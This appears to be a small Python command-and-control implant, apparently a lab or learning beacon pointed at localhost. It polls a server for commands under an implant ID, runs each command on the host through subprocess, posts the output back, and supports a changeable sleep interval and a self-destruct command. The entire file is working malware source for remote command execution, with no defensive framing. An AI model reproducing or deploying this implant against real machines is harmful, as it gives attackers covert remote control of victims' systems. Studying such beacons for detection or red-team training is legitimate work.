import requests
import subprocess
from time import sleep
import sys

ADDR = "http://127.0.0.1"
PORT = 5000
URL = ADDR+":"+str(PORT)
IMPLANT_ID = 1337
SLEEP_TIME = 5 
INITIAL_SLEEP = 1

sleep(INITIAL_SLEEP)
while True:
    
    try:
        r = requests.get(URL+"/get", params ={"implantID":IMPLANT_ID})
    
        print(r.text)
        tokenized = r.text.split(" ")
        print(tokenized[0])
        if tokenized[0] == "SLEEP_TIME":
                SLEEP_TIME = int(tokenized[1])
                sendMe = "Sleep Updated" 
        elif tokenized[0] == "SELF_DESTRUCT":
                sys.exit("Exiting")
                sendMe = "Exiting"
        elif tokenized[0] == "":
                print("Sleeping")
                sleep(SLEEP_TIME)

                continue
        else:
            output = subprocess.run(tokenized, stdout=subprocess.PIPE)
            sendMe = output.stdout


        r = requests.post(URL+"/post", params ={"implantID":IMPLANT_ID}, data={'result': sendMe})
        print(r.text)
        sleep(SLEEP_TIME) 
    except Exception as e: 
        print(e)
        sleep(SLEEP_TIME)
    
        

